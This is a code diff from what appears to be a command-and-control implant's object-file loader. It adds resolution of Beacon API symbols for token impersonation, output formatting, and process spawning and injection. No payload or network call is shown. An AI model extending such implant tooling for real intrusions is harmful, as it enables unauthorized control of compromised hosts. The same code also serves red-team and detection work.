@@ -126,6 +126,8 @@ tasking::resolve_object_symbol(const char* symbol) {
     //
 
     if(strncmp("Beacon", symbol, 6) == 0) {
+
+                /* data parse */
         if (strcmp("BeaconDataParse", symbol) == 0) {
             resolved_func = BeaconDataParse;
         } else if (strcmp("BeaconDataInt", symbol) == 0) {
@@ -140,7 +142,50 @@ tasking::resolve_object_symbol(const char* symbol) {
             resolved_func = BeaconOutput;
         } else if (strcmp("BeaconPrintf", symbol) == 0) {
             resolved_func = BeaconPrintf;
-        } else {
+        }
+
+                /* token  */
+        else if (strcmp("BeaconIsAdmin", symbol) == 0) {
+            resolved_func = BeaconIsAdmin;
+        } else if (strcmp("BeaconUseToken", symbol) == 0) {
+            resolved_func = BeaconUseToken;
+        } else if (strcmp("BeaconRevertToken", symbol) == 0) {
+            resolved_func = BeaconRevertToken;
+        }
+
+                /* format */
+        else if(strcmp("BeaconFormatAlloc", symbol) == 0) {
+            resolved_func = BeaconFormatAlloc;
+        } else if(strcmp("BeaconFormatReset", symbol) == 0) {
+            resolved_func = BeaconFormatReset;
+        } else if(strcmp("BeaconFormatAppend", symbol) == 0) {
+            resolved_func = BeaconFormatAppend;
+        } else if(strcmp("BeaconFormatPrintf", symbol) == 0) {
+            resolved_func = BeaconFormatPrintf;
+        } else if(strcmp("BeaconFormatToString", symbol) == 0) {
+            resolved_func = BeaconFormatToString;
+        } else if(strcmp("BeaconFormatFree", symbol) == 0) {
+            resolved_func = BeaconFormatFree;
+        } else if(strcmp("BeaconFormatInt", symbol) == 0) {
+            resolved_func = BeaconFormatInt;
+        }
+
+                /* fork & run */
+        else if(strcmp("BeaconGetSpawnTo", symbol) == 0) {
+            resolved_func = BeaconGetSpawnTo;
+        } else if(strcmp("BeaconSpawnTemporaryProcess", symbol) == 0) {
+            resolved_func = BeaconSpawnTemporaryProcess;
+        } else if(strcmp("BeaconInjectTemporaryProcess", symbol) == 0) {
+            resolved_func = BeaconInjectTemporaryProcess;
+        } else if(strcmp("BeaconInjectProcess", symbol) == 0) {
+            resolved_func = BeaconInjectProcess;
+        } else if(strcmp("BeaconCleanupProcess", symbol) == 0) {
+            resolved_func = BeaconCleanupProcess;
+        } else if(strcmp("toWideChar", symbol) == 0) {
+            resolved_func = toWideChar;
+        }
+
+        else {
             clear_beacon_output();
             manip_beacon_output((char*)(std::string("Unsupported beacon function: ") + symbol).c_str(), false, false, nullptr);
             return nullptr;
@@ -313,9 +358,9 @@ tasking::load_object(
         return false;
     }
 
-    ctx.header   = static_cast<PIMAGE_FILE_HEADER>(pobject);
+    ctx.header      = static_cast<PIMAGE_FILE_HEADER>(pobject);
     ctx.sym_table   = reinterpret_cast<PIMAGE_SYMBOL>(PTR_TO_U64(pobject) + ctx.header->PointerToSymbolTable);
-    ctx.sections = reinterpret_cast<PIMAGE_SECTION_HEADER>(PTR_TO_U64(pobject) + sizeof(IMAGE_FILE_HEADER));
+    ctx.sections    = reinterpret_cast<PIMAGE_SECTION_HEADER>(PTR_TO_U64(pobject) + sizeof(IMAGE_FILE_HEADER));
 
     if(ctx.header->Machine != IMAGE_FILE_MACHINE_AMD64) { //do not support 32 bit
         return false;
